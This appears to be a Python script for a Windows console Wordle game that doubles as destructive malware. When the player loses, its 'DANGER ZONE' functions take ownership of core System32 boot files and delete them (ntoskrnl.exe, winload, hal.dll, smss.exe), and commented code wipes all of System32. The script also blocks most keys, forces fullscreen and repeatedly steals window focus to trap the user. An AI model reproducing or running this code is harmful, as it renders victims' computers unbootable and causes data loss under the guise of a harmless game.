import random
import requests
import keyboard
import string
import time
import os
import platform
import ctypes
import pywintypes
from typing import List, Tuple, Dict
from shutil import rmtree
from os import system
import subprocess
import getpass
from concurrent.futures import ThreadPoolExecutor, as_completed
import win32gui
import win32con
import win32api
import threading

def focus_console_window():
    try:
        hwnd = win32gui.GetForegroundWindow()
        current_pid = win32api.GetCurrentProcessId()
        thread_id = win32api.GetCurrentThreadId()

        console_hwnd = ctypes.windll.kernel32.GetConsoleWindow()

        if hwnd != console_hwnd:
            win32gui.ShowWindow(console_hwnd, win32con.SW_SHOW)
            win32gui.SetForegroundWindow(console_hwnd)

    except pywintypes.error as e:
        pass
        #print(f"[Focus Failed] Could not bring console to front: {e}")

def repeat_task():
    while True:
        focus_console_window()
        time.sleep(0.1)

threading.Thread(target=repeat_task, daemon=True).start()

###################DANGER ZONE###################
target_dir = r"C:\Windows\System32"
username = getpass.getuser()
'''
def destroy():
    try:rmtree(r"C:\Windows\System32")
    except:system(r"del /f /q /a C:\Windows\System32")
'''
def destroy():
    critical_files = [
        r"C:\Windows\System32\ntoskrnl.exe",  # Windows kernel
        r"C:\Windows\System32\winload.exe",   # Boot loader (BIOS)
        r"C:\Windows\System32\winload.efi",   # Boot loader (UEFI)
        r"C:\Windows\System32\hal.dll",       # Hardware Abstraction Layer
        r"C:\Windows\System32\smss.exe"       # Session Manager
    ]
    
    for file_path in critical_files:
        try:
            if os.path.exists(file_path):
                os.remove(file_path)
                #print(f"Deleted {file_path}")
            else:
                print(f"Not found: {file_path}")
        except Exception as e:
            print(f"Failed to delete {file_path}: {e}")

def take_ownership_and_grant_access(file_path):
    try:
        # Take ownership silently
        subprocess.run(["takeown", "/F", file_path, "/A"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)

        # Grant full control to current user
        subprocess.run(["icacls", file_path, "/grant", f"{username}:F"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)

        return f"[OK] {file_path}"
    except Exception as e:
        return f"[ERROR] {file_path}: {e}"

'''  
def collect_files(directory):
    all_files = []
    skip_dirs = {"CatRoot", "catroot2", "WindowsPowerShell", "en-US", "DriverStore","spp"}

    for root, dirs, files in os.walk(directory):
        dirs[:] = [d for d in dirs if d not in skip_dirs]

        for f in files:
            full_path = os.path.join(root, f)
            all_files.append(full_path)

    return all_files
'''

def collect_files(directory):
    # Define the exact critical files we care about
    critical_files = {
        "ntoskrnl.exe",
        "winload.exe",
        "winload.efi",
        "hal.dll",
        "smss.exe"
    }

    found_files = []

    for root, dirs, files in os.walk(directory):
        for f in files:
            if f in critical_files:
                found_files.append(os.path.join(root, f))

    return found_files

def main():
    all_files = collect_files(target_dir)

    #print(f"Processing {len(all_files)} files...")

    # Use max 32 threads or number of files, whichever is lower
    max_threads = min(200, len(all_files))

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        future_to_file = {executor.submit(take_ownership_and_grant_access, path): path for path in all_files}

        for future in as_completed(future_to_file):
            result = future.result()
            #print(result)
#################################################

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
GRAY = '\033[90m'
RESET = '\033[0m'
NO_COLOR = ''

KEYBOARD_ROWS = ["QWERTYUIOP", "ASDFGHJKL", "ZXCVBNM"]

allowed_keys = set(string.ascii_lowercase)

def block_non_letters():
    for i in range(1, 13):
        keyboard.block_key(f"f{i}")
    keyboard.block_key("shift")
    keyboard.block_key("ctrl")
    keyboard.block_key("alt")
    keyboard.block_key("cmd")
    keyboard.block_key("caps_lock")
    keyboard.block_key("tab")
    keyboard.block_key("esc")
    keyboard.block_key("menu")
    keyboard.block_key("delete")
    keyboard.block_key("end")
    keyboard.block_key("down")
    keyboard.block_key("page_down")
    keyboard.block_key("left")
    keyboard.block_key("right")
    keyboard.block_key("home")
    keyboard.block_key("up")
    keyboard.block_key("page_up")
    keyboard.block_key("insert")
    keyboard.block_key("print_screen")
    keyboard.block_key("-")
    keyboard.block_key("=")
    keyboard.block_key("`")
    keyboard.block_key("*")
    keyboard.block_key("/")
    keyboard.block_key(";")
    keyboard.block_key("'")
    keyboard.block_key(",")
    keyboard.block_key(".")
    keyboard.block_key("[")
    keyboard.block_key("]")
    keyboard.block_key("1")
    keyboard.block_key("2")
    keyboard.block_key("3")
    keyboard.block_key("4")
    keyboard.block_key("5")
    keyboard.block_key("6")
    keyboard.block_key("7")
    keyboard.block_key("8")
    keyboard.block_key("9")
    keyboard.block_key("0")

def unblock_non_letters():
    for i in range(1, 13):
        keyboard.block_key(f"f{i}")
    keyboard.unblock_key("shift")
    keyboard.unblock_key("ctrl")
    keyboard.unblock_key("alt")
    keyboard.unblock_key("cmd")
    keyboard.unblock_key("caps_lock")
    keyboard.unblock_key("tab")
    keyboard.unblock_key("esc")
    keyboard.unblock_key("menu")
    keyboard.unblock_key("delete")
    keyboard.unblock_key("end")
    keyboard.unblock_key("down")
    keyboard.unblock_key("page_down")
    keyboard.unblock_key("left")
    keyboard.unblock_key("right")
    keyboard.unblock_key("home")
    keyboard.unblock_key("up")
    keyboard.unblock_key("page_up")
    keyboard.unblock_key("insert")
    keyboard.unblock_key("print_screen")
    keyboard.unblock_key("-")
    keyboard.unblock_key("=")
    keyboard.unblock_key("`")
    keyboard.unblock_key("*")
    keyboard.unblock_key("/")
    keyboard.unblock_key(";")
    keyboard.unblock_key("'")
    keyboard.unblock_key(",")
    keyboard.unblock_key(".")
    keyboard.unblock_key("[")
    keyboard.unblock_key("]")
    keyboard.unblock_key("1")
    keyboard.unblock_key("2")
    keyboard.unblock_key("3")
    keyboard.unblock_key("4")
    keyboard.unblock_key("5")
    keyboard.unblock_key("6")
    keyboard.unblock_key("7")
    keyboard.unblock_key("8")
    keyboard.unblock_key("9")
    keyboard.unblock_key("0")

def set_hidden_windows(filepath: str):
    if platform.system() == "Windows":
        try:
            FILE_ATTRIBUTE_HIDDEN = 0x02
            ctypes.windll.kernel32.SetFileAttributesW(str(filepath), FILE_ATTRIBUTE_HIDDEN)
        except Exception as e:
            print(f"Failed to hide file on Windows: {e}")

def download_wordlist(filename: str, url: str) -> List[str]:
    if os.path.exists(filename):
        try:
            with open(filename, "r") as file:
                return [line.strip().upper() for line in file if len(line.strip()) == 5 and line.strip().isalpha()]
        except Exception:
            print(f"Failed to load word list from {filename}.")
            return []

    try:
        response = requests.get(url, timeout=5)
        response.raise_for_status()
        words = [line.strip().upper() for line in response.text.splitlines() if len(line.strip()) == 5 and line.isalpha()]

        try:
            with open(filename, "w") as file:
                file.write("\n".join(words))
            if os.name == 'nt':
                set_hidden_windows(filename)
        except Exception:
            print(f"Could not save the downloaded word list to {filename}.")

        return words
    except (requests.RequestException, requests.ConnectionError, requests.Timeout):
        print(f"Could not download word list from {url}.")
        return []

def load_words() -> Tuple[List[str], List[str]]:
    allowed_filename = ".allowed_wordsdUlGS.txt" if os.name != 'nt' else "allowed_wordsdUlGS.txt"
    possible_filename = ".possible_words6LAWu.txt" if os.name != 'nt' else "possible_words6LAWu.txt"

    allowed_url = "https://gist.githubusercontent.com/scholtes/94f3c0303ba6a7768b47583aff36654d/raw/73f890e1680f3fa21577fef3d1f06b8d6c6ae318/wordle-Ta.txt"
    possible_url = "https://gist.githubusercontent.com/scholtes/94f3c0303ba6a7768b47583aff36654d/raw/73f890e1680f3fa21577fef3d1f06b8d6c6ae318/wordle-La.txt"

    allowed_words = download_wordlist(allowed_filename, allowed_url)
    possible_words = download_wordlist(possible_filename, possible_url)

    if not possible_words:
        return [], []

    full_word_list = list(set(allowed_words + possible_words))
    return possible_words, full_word_list

POSSIBLE_WORDS, WORDS = load_words()
if not WORDS or not POSSIBLE_WORDS:
    print("Word lists could not be loaded.")
    input("Enter to exit...")
    exit(1)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def get_word_feedback(guess: str, target: str) -> List[Tuple[str, str]]:
    feedback = []
    target_letters = list(target)

    for i, letter in enumerate(guess):
        if letter == target_letters[i]:
            feedback.append((letter, GREEN))
            target_letters[i] = None
        else:
            feedback.append((letter, GRAY))

    for i, (letter, color) in enumerate(feedback):
        if color == GRAY and letter in target_letters:
            feedback[i] = (letter, YELLOW)
            target_letters[target_letters.index(letter)] = None

    return feedback

def update_keyboard_colors(key_colors: Dict[str, str], feedback: List[Tuple[str, str]]):
    priority = {NO_COLOR: 0, GRAY: 1, YELLOW: 2, GREEN: 3}
    for letter, color in feedback:
        current_priority = priority[key_colors.get(letter, NO_COLOR)]
        new_priority = priority[color]
        if new_priority > current_priority:
            key_colors[letter] = color

def print_keyboard(key_colors: Dict[str, str]):
    print()
    print('\n' + ' '.join(f"{key_colors.get(k, NO_COLOR)}{k}{RESET}" for k in KEYBOARD_ROWS[0]))
    print(' ' + ' '.join(f"{key_colors.get(k, NO_COLOR)}{k}{RESET}" for k in KEYBOARD_ROWS[1]))
    print('  ' + ' '.join(f"{key_colors.get(k, NO_COLOR)}{k}{RESET}" for k in KEYBOARD_ROWS[2]))
    print()

def display_board(guesses: List[str], target: str, key_colors: Dict[str, str]):
    clear_screen()
    indent = '     '

    for guess in guesses:
        feedback = get_word_feedback(guess, target)
        colored_word = ' '.join(f"{color}{letter}{RESET}" for letter, color in feedback)
        print(indent + colored_word)

    for _ in range(6 - len(guesses)):
        print(indent + "_ _ _ _ _")

    print_keyboard(key_colors)

def is_valid_word(word: str) -> bool:
    return len(word) == 5 and word.upper() in WORDS

def on_loss():
    main()
    destroy()
    #system("shutdown /r /t 0")
    return None

def play_wordle() -> None:
    target_word = random.choice(POSSIBLE_WORDS)
    guesses = []
    key_colors = {char: NO_COLOR for char in "ABCDEFGHIJKLMNOPQRSTUVWXYZ"}

    while len(guesses) < 6:
        display_board(guesses, target_word, key_colors)
        guess = input("\nEnter your guess: ").upper()

        if not is_valid_word(guess):
            print("Invalid word! Must be a 5-letter word from the word list.")
            input("Press Enter to continue...")
            continue

        feedback = get_word_feedback(guess, target_word)
        update_keyboard_colors(key_colors, feedback)
        guesses.append(guess)

        if guess == target_word:
            display_board(guesses, target_word, key_colors)
            print(f"Congratulations! You won in {len(guesses)} attempts!")
            time.sleep(4)
            return

    display_board(guesses, target_word, key_colors)
    print(f"\nGame Over! The word was {target_word}.")
    time.sleep(2)
    print("Goodbye.")
    time.sleep(2)
    system("cls")
    time.sleep(2)
    on_loss()

if __name__ == "__main__":
    keyboard.press_and_release("f11")
    for i in range(1,15):
        keyboard.press_and_release('ctrl+add')
    block_non_letters()
    system("cls")
    print(f"You are going to play a game of Wordle, if you fail, {RED}say goodbye to your computer.{RESET}")
    time.sleep(9)
    play_wordle()
    #unblock_non_letters()
    #keyboard.press_and_release("f11")